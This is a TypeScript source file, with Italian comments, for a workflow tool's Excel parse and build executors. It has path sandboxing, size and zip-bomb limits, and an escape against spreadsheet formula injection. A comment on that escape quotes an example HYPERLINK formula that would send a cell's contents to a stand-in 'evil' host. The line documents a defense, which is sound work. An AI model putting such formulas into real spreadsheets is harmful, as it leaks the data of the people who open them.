/**
 * Excel (XLSX) executors — parse + build.
 *
 * Why we need them:
 *   • Supplier conferma ordine → arriva XLSX via email IMAP → parse → DB
 *   • Customer template fill-in → genera XLSX → email allegato → parse al ritorno
 *
 * Library: `exceljs` — battle-tested, supports streaming for large files,
 * handles xlsx+xlsm+csv, preserves number formats / dates / formulas.
 *
 * Both executors share the same sandboxed path resolution as `file.ts`
 * (tenant namespace under /var/data/flowforge/tenants/<tenant>/files), so
 * uploading from / saving to disk respects the same security model.
 */

import { coerceString } from '@/lib/coerce.js';
import { assertInputSizeWithinCap } from '@/lib/input-size-guard.js';
import { assertNoZipBombDeep } from '@/lib/zip-bomb-guard.js';
import { readFile, writeFile, stat, mkdir } from 'node:fs/promises';
import { resolve, sep, dirname, basename } from 'node:path';
import ExcelJS from 'exceljs';
import type { NodeExecutor } from '@flowforge/nodes-stdlib';
import { resolveBinaryValue, makeBinaryInline } from '@flowforge/core-schema';

function asString(v: unknown): string {
  return typeof v === 'string' ? v : '';
}

/**
 * N13 audit (2026-05-29): defense contro CSV/Excel formula injection
 * (OWASP WSTG-INPV-09 / CWE-1236).
 *
 * Excel/LibreOffice/Google Sheets interpretano una cella string che
 * inizia con `=`, `+`, `-`, `@`, TAB (\\t) o CR (\\r) come FORMULA.
 * Vettore tipico: workflow LLM scrive valore utente-controllato in
 * `out[key]` → cliente apre report.xlsx → formula tipo
 * `=HYPERLINK("http://evil/leak?d="&A2,"click")` leak la cella A2
 * verso server attacker.
 *
 * Mitigation OWASP: prefisso apex (`'`) prima del trigger char rende
 * la cella un literal string (l'apex stesso non viene mostrato in
 * Excel). Solo le cell di tipo string sono affette — number/Date
 * non hanno il problema.
 */
const FORMULA_PREFIX_REGEX = /^[=+\-@\t\r]/;
/** Cap dimensione input XLSX (50 MB) — file su disco E base64/BinaryData. */
const XLSX_MAX_INPUT_BYTES = 50 * 1024 * 1024;
function escapeFormulaInjection(v: unknown): unknown {
  if (typeof v !== 'string') return v;
  if (v.length > 0 && FORMULA_PREFIX_REGEX.test(v)) return `'${v}`;
  return v;
}

function getTenantRoot(tenantId: string): string {
  const safeTenant = (tenantId || 'default').replace(/[^a-z0-9_-]/gi, '_');
  const baseDir = process.env.FLOWFORGE_DATA_DIR ?? '/var/data/flowforge';
  return resolve(baseDir, 'tenants', safeTenant, 'files');
}

function getGlobalAllowlist(): string[] {
  const envList = process.env.FLOWFORGE_FILE_ALLOWLIST ?? '';
  return envList.split(':').map((p) => p.trim()).filter(Boolean).map((p) => resolve(p));
}

function assertPathAllowed(filePath: string, tenantId: string): string {
  if (typeof filePath !== 'string' || filePath.trim() === '') {
    throw new Error('file path is empty');
  }
  const tenantRoot = getTenantRoot(tenantId);
  const abs = filePath.startsWith('/') ? resolve(filePath) : resolve(tenantRoot, filePath);
  if (abs === tenantRoot || abs.startsWith(tenantRoot + sep)) return abs;
  const globalAllow = getGlobalAllowlist();
  const inGlobal = globalAllow.some((root) => abs === root || abs.startsWith(root + sep));
  if (inGlobal) return abs;
  throw new Error(`Path "${abs}" outside tenant namespace.`);
}

/**
 * action_xlsx_parse — read .xlsx → array of {column: value} objects.
 *
 * Input shape (one of):
 *   • config.path        — absolute or relative path in sandbox
 *   • config.base64      — base64-encoded xlsx bytes (e.g. from an IMAP attachment)
 *   • inline workflow input where input is a Buffer (rare)
 *
 * Header strategy:
 *   • If config.headerRow > 0 (default 1), that row becomes the keys
 *   • If config.headerRow = 0, rows are arrays (positional) instead
 *
 * Sheet selection:
 *   • config.sheetName — exact name; defaults to first sheet
 *
 * Output: { rows, sheetName, totalRows, columns }
 */
export const xlsxParseExecutor: NodeExecutor = async (config, input, context) => {
  const start = Date.now();

  // Resolve XLSX bytes — PRECEDENZA (ref-primario):
  //   input BinaryData (handle, es. da http binary-ref / file-read / pdf) >
  //   config.base64 (inline legacy) > config.path (file su disco).
  // resolveBinaryValue risolve i byte (ref su disco o inline) in modo trasparente:
  // l'excel non sa SE era un ref content-addressed o un base64.
  let buffer: Buffer;
  const rawPath = asString(config.path);
  const base64 = asString(config.base64);
  const binBytes = await resolveBinaryValue(input, context.readBinary);
  if (binBytes) {
    buffer = binBytes;
  } else if (base64) {
    buffer = Buffer.from(base64, 'base64');
  } else if (rawPath) {
    const abs = assertPathAllowed(rawPath, context.tenantId);
    const stats = await stat(abs);
    if (!stats.isFile()) throw new Error(`Path "${abs}" is not a regular file`);
    if (stats.size > XLSX_MAX_INPUT_BYTES) {
      throw new Error(`File too large (${stats.size.toString()} bytes). Max 50MB.`);
    }
    buffer = await readFile(abs);
  } else {
    throw new Error('action_xlsx_parse: missing input (need either config.path or config.base64)');
  }

  // Cap UNIFORME su OGNI input (fix 2026-06-17): i 50MB erano enforced SOLO sul file
  // da disco (stat), NON su base64/BinaryData da upstream (es. allegato IMAP enorme)
  // → ExcelJS.load amplificava in memoria → OOM. Ora il cap vale per tutti gli input.
  assertInputSizeWithinCap(buffer.byteLength, XLSX_MAX_INPUT_BYTES, 'File');
  // ANTI ZIP-BOMB: l'.xlsx è uno ZIP — il cap sui byte compressi NON basta, exceljs
  // decomprime TUTTO in memoria al load. `assertNoZipBombDeep` INFLAZIONA davvero ogni
  // entry (streaming, con budget cumulativo) → blocca anche la bomba che DICHIARA una
  // size piccola ma il cui deflate-stream espande a GB (il solo declared-check è aggirabile).
  await assertNoZipBombDeep(buffer);

  const workbook = new ExcelJS.Workbook();
  // exceljs accepts ArrayBuffer. Copy the relevant slice of the Node Buffer
  // so we don't pass a SharedArrayBuffer (which the loader doesn't accept).
  const arrayBuf = new ArrayBuffer(buffer.byteLength);
  new Uint8Array(arrayBuf).set(buffer);
  await workbook.xlsx.load(arrayBuf);

  const wantedSheet = asString(config.sheetName);
  const sheet = wantedSheet ? workbook.getWorksheet(wantedSheet) : workbook.worksheets[0];
  if (!sheet) {
    const names = workbook.worksheets.map((w) => w.name);
    throw new Error(`action_xlsx_parse: sheet not found. Available: ${names.join(', ')}`);
  }

  const headerRow = Number(config.headerRow ?? 1);
  const startRow = headerRow > 0 ? headerRow + 1 : 1;

  // Build column index → key mapping
  let columns: string[] = [];
  if (headerRow > 0) {
    const hr = sheet.getRow(headerRow);
    const cellCount = hr.cellCount;
    for (let c = 1; c <= cellCount; c += 1) {
      const cell = hr.getCell(c);
      columns.push(coerceString(cell.value ?? `col_${c.toString()}`).trim());
    }
  } else {
    // Positional: derive col count from the widest row.
    // reduce, NON Math.max(...spread): su un foglio con milioni di righe lo spread
    // supererebbe il limite di argomenti dello stack → RangeError "Maximum call
    // stack size exceeded" (anti-pattern già corretto altrove nel codebase).
    const maxCells = sheet.getSheetValues().reduce<number>(
      (max, row) => (Array.isArray(row) && row.length > max ? row.length : max), 0,
    );
    columns = Array.from({ length: maxCells }, (_v, i) => `col_${(i + 1).toString()}`);
  }

  // Cap righe (anti-OOM): la description promette "max 1M rows" — qui è ENFORCED.
  // Raggiunto il cap → `truncated=true` e stop (no crash su file giganti).
  const MAX_PARSE_ROWS = 1_000_000;
  const rows: Record<string, unknown>[] = [];
  let emptyCellsCount = 0;
  let truncated = false;
  for (let r = startRow; r <= sheet.rowCount; r += 1) {
    if (rows.length >= MAX_PARSE_ROWS) { truncated = true; break; }
    const xlRow = sheet.getRow(r);
    if (!xlRow.hasValues) continue;
    const obj: Record<string, unknown> = {};
    for (let c = 1; c <= columns.length; c += 1) {
      let key = columns[c - 1] ?? `col_${c.toString()}`;
      // SECURITY: l'header colonna proviene dal file (ostile). Una chiave
      // `__proto__`/`constructor`/`prototype` su un object-literal può alterare
      // il prototype della riga → la rinominiamo a col_N (difesa-in-profondità).
      if (key === '__proto__' || key === 'constructor' || key === 'prototype') key = `col_${c.toString()}`;
      const cell = xlRow.getCell(c);
      // Normalize cell value: dates as ISO, formulas as result, plain values as-is.
      let val: unknown = cell.value;
      if (val !== null && typeof val === 'object') {
        if (val instanceof Date) val = val.toISOString();
        else if ('result' in val && val.result !== undefined) val = val.result;
        else if ('text' in val && typeof (val).text === 'string') val = (val as { text: string }).text;
        else if ('richText' in val && Array.isArray((val as { richText: unknown[] }).richText)) {
          val = (val as { richText: { text: string }[] }).richText.map((t) => t.text).join('');
        }
      }
      if (val === null || val === undefined || val === '') emptyCellsCount += 1;
      obj[key] = val;
    }
    rows.push(obj);
  }

  return {
    output: {
      rows, sheetName: sheet.name, totalRows: rows.length, columns,
      columnCount: columns.length, headerRow, emptyCellsCount, truncated,
    },
    durationMs: Date.now() - start,
  };
};

/**
 * action_xlsx_build — generate .xlsx from array of objects.
 *
 * Input shape:
 *   • config.rowsExpression / piped input → array of objects (all sharing the same keys)
 *   • config.sheetName  — sheet name (default 'Sheet1')
 *   • config.columns    — optional CSV "key:Label,key2:Label2" to control column order + display headers
 *   • config.path       — when set, write to disk and return path
 *   • when no path: return base64 (great for email attachments)
 *
 * Output: { path?, base64?, sheetName, rowsWritten, sizeBytes }
 */
/**
 * Excel constrains sheet names: max 31 chars, NO `\ / ? * [ ] :` and no
 * leading/trailing apostrophes. ExcelJS otherwise throws cryptically.
 * Truncate + replace invalid chars with `_`. Duplicate names within the
 * same workbook are NOT handled here (caller groups by unique value),
 * which is fine for the supplier-name use case.
 */
function sanitizeSheetName(raw: string): string {
  return raw
    .replace(/[\\/?*[\]:]/g, '_')
    .replace(/^'+|'+$/g, '')
    .slice(0, 31) || 'Sheet1';
}

/**
 * Per-column formatter. Maps a FlowForge short code to an Excel numFmt
 * pattern AND a coercion function. The numFmt is what tells Excel /
 * LibreOffice how to RENDER the cell (locale-aware: a `#,##0.00` pattern
 * shows as `1.234,56` in an Italian-locale workbook automatically).
 *
 * Coercion is critical: if you write the string "10,00" into a cell with
 * numFmt = "0.00%", Excel treats it as text and the format does nothing.
 * The cell value MUST be a JS number (or Date) for the format to apply.
 *
 * Short codes are exposed in the node UI's "columns" syntax extension:
 *   sku:Codice:text,prezzo:Prezzo:eur_4,sconto:Sconto:percent_2
 */
type ColumnFormat = 'auto' | 'text' | 'integer' | 'number_2' | 'number_4' | 'eur_2' | 'eur_4' | 'percent_2' | 'date_dmy' | 'datetime';

export function fmtCode(format: ColumnFormat): string {
  // LCID "Italian (Italy)" = 0x410 → prefix `[$-410]` tells Excel/LibreOffice
  // "interpret thousand/decimal separators with Italian rules" (`.` for
  // thousands, `,` for decimals) regardless of the viewer's own locale.
  // Without this prefix, a viewer in en-US shows "1,234.56 €" even though
  // the data was written for IT-IT. The prefix is the official Microsoft
  // way to embed locale-specific formatting in a cross-locale spreadsheet.
  // Ref: https://learn.microsoft.com/en-us/openspecs/office_standards/ms-oe376/
  const IT = '[$-410]';
  switch (format) {
    case 'integer':   return `${IT}#,##0`;
    case 'number_2':  return `${IT}#,##0.00`;
    case 'number_4':  return `${IT}#,##0.0000`;
    case 'eur_2':     return `${IT}#,##0.00\\ "€"`;
    case 'eur_4':     return `${IT}#,##0.0000\\ "€"`;
    case 'percent_2': return `${IT}0.00%`;
    case 'date_dmy':  return `${IT}dd-mm-yyyy`;
    case 'datetime':  return `${IT}dd-mm-yyyy\\ hh:mm`;
    case 'text':      return '@';
    case 'auto':
    default:          return '';
  }
}

/**
 * Coerce a cell value to the JS type expected by the formatter. Strings
 * like "10,50" (italian decimal) are parsed to a Number; ISO date strings
 * to Date objects. Returns the value unchanged when nothing reasonable can
 * be done (so we never lose data, the cell just stays raw).
 */
export function coerceForFormat(value: unknown, format: ColumnFormat): unknown {
  if (value === null || value === undefined || value === '') return value;
  if (format === 'text' || format === 'auto') return value;
  if (format === 'date_dmy' || format === 'datetime') {
    if (value instanceof Date) return value;
    const s = coerceString(value).trim();
    if (/^\d{4}-\d{2}-\d{2}/.test(s)) {
      const d = new Date(s);
      if (!isNaN(d.getTime())) return d;
    }
    const dmy = /^(\d{1,2})[-/.](\d{1,2})[-/.](\d{2,4})/.exec(s);
    if (dmy) {
      const [, dd, mm, yy] = dmy;
      const year = yy?.length === 2 ? Number(`20${yy}`) : Number(yy);
      const d = new Date(year, Number(mm) - 1, Number(dd));
      if (!isNaN(d.getTime())) return d;
    }
    return value;
  }
  if (typeof value === 'number') {
    if (format === 'percent_2') return percentNormalize(value);
    if (format === 'integer') return Math.trunc(value);
    return value;
  }
  const s = coerceString(value).trim().replace(/\s/g, '').replace(/[€%$£]/g, '');
  const normalized = s.includes(',') && !/^\d+\.\d+$/.test(s)
    ? s.replace(/\./g, '').replace(',', '.')
    : s.replace(/,(?=\d{3}(\D|$))/g, '');
  const n = Number(normalized);
  if (!Number.isFinite(n)) return value;
  if (format === 'percent_2') return percentNormalize(n);
  if (format === 'integer') return Math.trunc(n);
  return n;
}

/**
 * Auto-detect: il valore percent in ingresso è già decimale (0.10 = 10%)
 * o percentuale numerica (10 = 10%)? Il LLM Liara estrae diversamente a
 * seconda della formattazione del PDF sorgente — quindi NON possiamo
 * fidarci di una convention fissa.
 *
 * Regola: se |n| > 1, assumiamo che sia già percentuale (67.61 → 0.6761).
 * Se 0 < |n| ≤ 1, assumiamo che sia decimale (0.1 → 0.1).
 * Se 0, neutro.
 *
 * Edge case "1%": ambiguo. 1 può essere 1% (→ 0.01) o 100% (→ 1.0). La
 * regola scelta tratta 1 come 100% (decimale già). Documentato.
 * Se serve cambiare, lo facciamo via configField del nodo.
 */
function percentNormalize(n: number): number {
  if (Math.abs(n) > 1) return n / 100;
  return n;
}

/**
 * Auto-infer a sensible column format from the column NAME when the user
 * hasn't specified one explicitly. Federico-grade UX: "PREZZO" should
 * always come out as euro currency without making the operator memorize
 * the `:eur_4` syntax. Heuristic patterns are case-insensitive and ordered
 * by specificity (more specific first wins).
 *
 * If you don't like the auto-inference for a given column, override it
 * explicitly with `:text` or `:auto` (no format) in the columns config.
 */
export function inferFormatFromName(name: string): ColumnFormat {
  const n = name.toUpperCase().trim();
  // Dates first — substring match BEFORE numeric inference so that
  // "DATA CONSEGNA" doesn't accidentally hit a number rule.
  if (/(^|[^A-Z])(DATA|DATE|CONSEGNA|SCADENZA|EMISSIONE|GIORNO|DATA\.|DOB)([^A-Z]|$)/.test(n)) return 'date_dmy';
  // Percent
  if (/(SCONTO|PERCENT|%|RATE\s*%|IVA\s*%|ALIQUOTA)/.test(n)) return 'percent_2';
  // Money — 4 decimal for unit prices, 2 decimal for totals/grand totals
  if (/(PREZZO|PREZZO\s*UN|UNIT\s*PRICE|LISTINO|COSTO)/.test(n)) return 'eur_4';
  if (/(TOTALE|TOT\b|GRAND\s*TOT|IMPONIBILE|FATTURA|NETTO|LORDO|IMPORTO|SUBTOTAL|AMOUNT|VALORE|VALUE)/.test(n)) return 'eur_2';
  // Integer (quantità)
  if (/(QUANTITA|QTA|QTY|NUMERO|N\.|COUNT|PEZZI|PCS|UNIT[A']?)/.test(n)) return 'integer';
  // Identifier-ish → text (preserves leading zeros like "001234")
  if (/(CODICE|ID\b|SKU|CODE|REFERENZA|REF\b|MATRICOLA|EAN|UPC|TARGA|CAP|PARTITA|VAT)/.test(n)) return 'text';
  return 'auto';
}

export function parseColumnsConfig(raw: string): { key: string; header: string; format: ColumnFormat }[] {
  const validFormats: ColumnFormat[] = ['auto','text','integer','number_2','number_4','eur_2','eur_4','percent_2','date_dmy','datetime'];
  return raw.split(',').map((pair) => {
    const parts = pair.split(':').map((s) => s.trim());
    const key = parts[0] ?? '';
    const header = parts[1] ?? key;
    const formatRaw = (parts[2] ?? '').toLowerCase();
    let format: ColumnFormat;
    if (formatRaw && validFormats.includes(formatRaw as ColumnFormat)) {
      // Explicit format wins.
      format = formatRaw as ColumnFormat;
    } else {
      // No explicit format → infer from header AND key (whichever matches).
      const fromHeader = inferFormatFromName(header);
      format = fromHeader !== 'auto' ? fromHeader : inferFormatFromName(key);
    }
    return { key, header, format };
  }).filter((c) => c.key);
}

/**
 * Auto-fit each column's width: scan all cells, measure rendered text
 * length, cap to a sensible max so a 4000-char description doesn't blow
 * out the layout. ExcelJS doesn't ship a real autofit (xlsx files store
 * only "desired width", not pixels), but `max(content.length) + padding`
 * is what every other tool does and yields good results.
 */
/**
 * Pre-format a number as an Italian-locale display string. Used when the
 * `forceItalianStrings` flag is on, to guarantee that even viewers that
 * ignore the LCID prefix (Numbers macOS, Excel set to en-US, LibreOffice
 * neutral) show the user-expected `1.234,56 €` instead of `1,234.56 €`.
 *
 * Trade-off: the cell loses its numeric type — sorting/sum/avg in Excel
 * won't work on this column. Compromise accepted by default because:
 *   1. The output is typically read by a human, not used as input.
 *   2. The raw value is still in the source DB; downstream queries don't
 *      go through this XLSX.
 *   3. Federico-demo target: display correctness > spreadsheet math.
 */
/**
 * Italian number formatting senza dipendere da ICU full del Node runtime.
 * Node 20 default ha small-icu = solo en-US — `toLocaleString('it-IT')`
 * non inserisce il punto delle migliaia. Costruisco la stringa a mano:
 *
 *   1234567.89 → "1.234.567,89"
 *   1052.00    → "1.052,00"
 *   67.68      → "67,68"
 *   -42.5      → "-42,50"
 *
 * Garantito identico in qualunque ambiente Node (no ICU dipendenza).
 */
function formatItalianNumber(n: number, decimals: number): string {
  const fixed = Math.abs(n).toFixed(decimals);
  const [intPart, decPart] = fixed.split('.');
  const sign = n < 0 ? '-' : '';
  const intWithThousands = (intPart ?? '0').replace(/\B(?=(\d{3})+(?!\d))/g, '.');
  return decPart ? `${sign}${intWithThousands},${decPart}` : `${sign}${intWithThousands}`;
}

function formatItalianString(n: number, format: ColumnFormat): string {
  switch (format) {
    case 'eur_2':     return `${formatItalianNumber(n, 2)} €`;
    case 'eur_4':     return `${formatItalianNumber(n, 4)} €`;
    case 'percent_2': return `${formatItalianNumber(n * 100, 2)}%`;
    case 'integer':   return formatItalianNumber(n, 0);
    case 'number_2':  return formatItalianNumber(n, 2);
    case 'number_4':  return formatItalianNumber(n, 4);
    default:          return String(n);
  }
}

/**
 * Autofit colonne — la larghezza è il MAX tra l'header e il contenuto più
 * lungo della colonna, con un cap morbido a 120 char per evitare che una
 * descrizione mega-lunga rovini il layout. NIENTE cap inferiore (8) né
 * cap intermedio (40/60): le colonne piccole restano piccole, le grandi
 * crescono fino a 120 per leggere senza wrap.
 *
 * Regola Federico: "se il titolo è più lungo, vince il titolo".
 * Implementata letteralmente — il max() considera header E content,
 * il maggiore vince.
 */
function autoFitColumns(sheet: ExcelJS.Worksheet, headers: string[]): void {
  sheet.columns.forEach((col, idx) => {
    const header = headers[idx] ?? '';
    // Pesa header e contenuto separatamente — Federico-rule:
    // "se il titolo è più lungo, vince il titolo".
    let maxContentLen = 0;
    if (typeof col.eachCell === 'function') {
      col.eachCell({ includeEmpty: false }, (cell) => {
        const v = cell.value;
        let text = '';
        if (v instanceof Date) text = '01-01-2026';
        else if (typeof v === 'object' && v !== null) text = JSON.stringify(v);
        else text = String(v ?? '');
        if (text.length > maxContentLen) maxContentLen = text.length;
      });
    }
    // Padding 8 (era 5) per Excel Android/Mobile che ha glyph più larghi
    // di Office desktop e width units calcolate diversamente.
    // Min 18 (era 12) — garantisce che PERFINO header tipo "DATA" (4 char)
    // sia leggibile con padding pieno senza compressione visiva.
    // Cap 220 (era 200) per accomodare descrizioni articolo molto lunghe.
    const headerWidth = header.length + 8;
    const contentWidth = maxContentLen + 8;
    col.width = Math.min(220, Math.max(18, headerWidth, contentWidth));
  });
}

export const xlsxBuildExecutor: NodeExecutor = async (config, input, context) => {
  const start = Date.now();

  // Multi-sheet support: if `groupByKey` is set, group the source rows by
  // that key and create one worksheet per distinct value. Useful for "1
  // marchio = 1 scheda" pattern (the canonical Italian procurement Excel
  // layout). Falls back to single-sheet behavior when groupByKey is empty.
  const groupByKey = asString(config.groupByKey).trim();

  // Resolve source rows from the same precedence chain as before:
  // (1) dataExpression (engine-interpolated), (2) array input, (3) { rows: [...] },
  // (4) single object wrapped as 1-row array.
  let rows: Record<string, unknown>[] = [];
  const dataExpr = config.dataExpression;
  if (Array.isArray(dataExpr)) {
    rows = dataExpr as Record<string, unknown>[];
  } else if (typeof dataExpr === 'object' && dataExpr !== null && Array.isArray((dataExpr as Record<string, unknown>).rows)) {
    rows = (dataExpr as { rows: Record<string, unknown>[] }).rows;
  } else if (typeof dataExpr === 'string' && dataExpr.trim().startsWith('[')) {
    try { rows = JSON.parse(dataExpr) as Record<string, unknown>[]; } catch { /* fall through */ }
  }
  if (rows.length === 0) {
    if (Array.isArray(input)) {
      rows = input as Record<string, unknown>[];
    } else if (input !== null && typeof input === 'object' && Array.isArray((input as Record<string, unknown>).rows)) {
      rows = (input as { rows: Record<string, unknown>[] }).rows;
    } else if (typeof input === 'object' && input !== null) {
      rows = [input as Record<string, unknown>];
    }
  }
  if (rows.length === 0) {
    throw new Error('action_xlsx_build: nothing to write — set "Sorgente righe" to e.g. {{$node.NomeNodo.json.lines}} or ensure the previous node outputs an array.');
  }

  // Column setup: explicit "key:Label:format,key2:Label2:format2" or
  // auto-discover from row 0 (no format = 'auto', raw values written as-is).
  // Extended syntax (back-compat — third segment is optional):
  //   sku:Codice                  → header "Codice", format auto
  //   sku:Codice:text             → forced text rendering (preserves leading zeros)
  //   prezzo:Prezzo:eur_4         → "1.234,5678 €" (4 decimal euro)
  //   sconto:Sconto:percent_2     → "10,00%"
  //   data:Data ordine:date_dmy   → "23-05-2026"
  const columnsConfig = asString(config.columns);
  let cols: { key: string; header: string; format: ColumnFormat }[];
  if (columnsConfig.trim()) {
    cols = parseColumnsConfig(columnsConfig);
  } else {
    // Auto-discover columns from the first row, AND auto-infer format
    // from each key name (so even "ridimensiona, runa, e basta" workflows
    // get sensible Excel formatting out of the box).
    cols = Object.keys(rows[0] ?? {}).map((k) => ({ key: k, header: k, format: inferFormatFromName(k) }));
  }

  // Group rows by sheet name. When groupByKey is set, each distinct value
  // of that key becomes a sheet name; rows missing the key fall under
  // "(senza valore)". When NOT set, all rows go into one sheet whose name
  // comes from config.sheetName (back-compat).
  const sheetGroups = new Map<string, Record<string, unknown>[]>();
  if (groupByKey) {
    for (const row of rows) {
      const rawValue = row[groupByKey];
      const sheetName = sanitizeSheetName(
        rawValue == null || rawValue === '' ? '(senza valore)' : coerceString(rawValue),
      );
      const bucket = sheetGroups.get(sheetName) ?? [];
      bucket.push(row);
      sheetGroups.set(sheetName, bucket);
    }
  } else {
    const single = sanitizeSheetName(asString(config.sheetName) || 'Sheet1');
    sheetGroups.set(single, rows);
  }

  const workbook = new ExcelJS.Workbook();
  workbook.creator = 'FlowForge';
  workbook.created = new Date();

  // Modalità "italiano garantito": valori numerici scritti come stringhe
  // pre-formattate. Trade-off documentato in formatItalianString(). Default
  // ON perché copre QUALSIASI viewer (Numbers macOS, Excel Android, Google
  // Sheets, LibreOffice EN) senza affidarsi al supporto LCID che è bacato
  // su molti client mobili e cross-locale.
  const forceItalianStrings = coerceString(config.forceItalianStrings ?? 'true') !== 'false';
  const isNumericFmt = (f: ColumnFormat): boolean =>
    f === 'integer' || f === 'number_2' || f === 'number_4'
    || f === 'eur_2' || f === 'eur_4' || f === 'percent_2';

  for (const [name, sheetRows] of sheetGroups) {
    const sheet = workbook.addWorksheet(name);
    sheet.columns = cols.map((c) => {
      const col: Partial<ExcelJS.Column> = {
        header: c.header,
        key: c.key,
      };
      // Quando forziamo stringhe italiane, NON applichiamo numFmt al
      // column-default: scriviamo già il testo formattato e numFmt='@'
      // farebbe il display "as-is" che è quello che vogliamo.
      const numFmt = (forceItalianStrings && isNumericFmt(c.format)) ? '@' : fmtCode(c.format);
      if (numFmt) col.numFmt = numFmt;
      if (!forceItalianStrings && isNumericFmt(c.format)) {
        col.alignment = { horizontal: 'right', vertical: 'middle' };
      } else if (forceItalianStrings && isNumericFmt(c.format)) {
        // Le stringhe italiane stay allineate a destra per leggibilità
        // (è quello che ti aspetti vedendo prezzi).
        col.alignment = { horizontal: 'right', vertical: 'middle' };
      } else if (c.format === 'date_dmy' || c.format === 'datetime') {
        col.alignment = { horizontal: 'center', vertical: 'middle' };
      } else {
        col.alignment = { horizontal: 'left', vertical: 'middle', wrapText: true };
      }
      return col as ExcelJS.Column;
    });

    // Header styling — bold + grigio + bordo bottom. NIENTE wrapText
    // forzato sul header: la colonna è già larga abbastanza (autoFit
    // a max(header, content)+3), quindi l'header sta su una riga sola.
    const headerRow = sheet.getRow(1);
    headerRow.font = { bold: true, color: { argb: 'FF1F2937' }, size: 11 };
    headerRow.fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFE5E7EB' } };
    headerRow.alignment = { horizontal: 'center', vertical: 'middle' };
    headerRow.height = 26;
    headerRow.border = { bottom: { style: 'thin', color: { argb: 'FF9CA3AF' } } };

    for (const row of sheetRows) {
      const out: Record<string, unknown> = {};
      for (const c of cols) {
        const raw = coerceForFormat(row[c.key] ?? '', c.format);
        // In forceItalianStrings mode, convertiamo ogni valore numerico
        // a una stringa italiana già formattata (1.234,56 €, 0,00%, ecc).
        // Le date rimangono Date object — `[$-410]dd-mm-yyyy` funziona
        // anche su Excel Android.
        if (forceItalianStrings && isNumericFmt(c.format) && typeof raw === 'number') {
          // N13: formatItalianString ritorna sempre prefix (numero) → no
          // formula vector. Bypass del sanitizer per non aggiungere apex
          // che romperebbe il rendering numerico nel cliente Excel.
          out[c.key] = formatItalianString(raw, c.format);
        } else {
          // N13 audit: applica escape SOLO ai valori string (number/Date
          // non sono formula-injectable).
          out[c.key] = escapeFormulaInjection(raw);
        }
      }
      const addedRow = sheet.addRow(out);
      cols.forEach((c, idx) => {
        const cell = addedRow.getCell(idx + 1);
        if (forceItalianStrings && isNumericFmt(c.format)) {
          cell.numFmt = '@'; // text marker
        } else {
          const numFmt = fmtCode(c.format);
          if (numFmt) cell.numFmt = numFmt;
        }
      });
    }

    const wantsAutoFilter = coerceString(config.autoFilter ?? 'true') !== 'false';
    if (wantsAutoFilter) {
      sheet.autoFilter = { from: { row: 1, column: 1 }, to: { row: 1, column: cols.length } };
    }
    const wantsFreeze = coerceString(config.freezeHeader ?? 'true') !== 'false';
    if (wantsFreeze) {
      sheet.views = [{ state: 'frozen', xSplit: 0, ySplit: 1 }];
    }

    // Auto-fit columns AFTER all rows are written (we need to see the
    // actual data lengths). Caps width to 60 chars so a 4KB description
    // doesn't stretch the sheet horizontally.
    autoFitColumns(sheet, cols.map((c) => c.header));
  }

  // Compose the legacy sheetName field for back-compat with downstream
  // consumers / logs — when multi-sheet, report the LIST of names.
  const sheetName = Array.from(sheetGroups.keys()).join(' | ');

  const arrayBuffer = await workbook.xlsx.writeBuffer();
  const xlsxBuffer = Buffer.from(arrayBuffer);

  const contentType = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet';
  const outPath = asString(config.path);

  let abs: string | null = null;
  let fileName: string;
  if (outPath) {
    abs = assertPathAllowed(outPath, context.tenantId);
    await mkdir(dirname(abs), { recursive: true });
    await writeFile(abs, xlsxBuffer);
    fileName = basename(abs);
  } else {
    fileName = `export-${Date.now().toString()}.xlsx`;
  }

  // REF-PRIMARIO: handle BinaryData (ref content-addressed con store, inline base64
  // senza = fail-soft). Niente base64 nel JSON → un Excel grande non gonfia
  // outputsById; si collega a send_email / Write File via resolver. Quando `path` è
  // settato il file è ANCHE su disco (archival), ma l'allegato viaggia come handle.
  const binary = context.writeBinary
    ? await context.writeBinary(xlsxBuffer, { mimeType: contentType, fileName })
    : makeBinaryInline({ mimeType: contentType, data: xlsxBuffer.toString('base64'), fileName });

  const base = { binary, sheetName, rowsWritten: rows.length, sizeBytes: xlsxBuffer.length, fileName, contentType };
  return {
    output: abs !== null ? { path: abs, ...base } : base,
    durationMs: Date.now() - start,
  };
};
